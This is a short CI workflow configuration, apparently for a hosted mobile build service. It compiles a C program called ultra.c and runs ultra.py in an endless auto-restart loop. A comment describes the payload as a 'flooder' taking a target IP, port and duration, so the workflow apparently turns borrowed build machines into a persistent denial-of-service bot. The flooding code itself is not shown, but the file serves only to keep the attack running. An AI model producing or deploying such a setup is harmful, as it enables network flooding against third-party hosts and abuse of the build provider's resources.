workflows:
  ultra_python_runner:
    name: Ultra Python Runner
    max_build_duration: 60
    environment:
      xcode: latest
    scripts:
      - name: Check project files
        script: ls -la
      - name: Install dependencies
        script: |
          python3 --version
          python3 -m pip install --upgrade pip
      - name: Compile ultra.c
        script: |
          gcc -pthread -O3 -o ultra ultra.c
          chmod +x ultra
      - name: Run bot (auto restart loop)
        script: |
          while true; do
            echo "🚀 Starting bot..."
            # Example: run flooder with custom IP/port/duration from environment
            # or just run python3 ultra.py which will call ./ultra
            python3 ultra.py
            echo "⚠️ Bot stopped. Restarting in 10 seconds..."
            sleep 10
          done
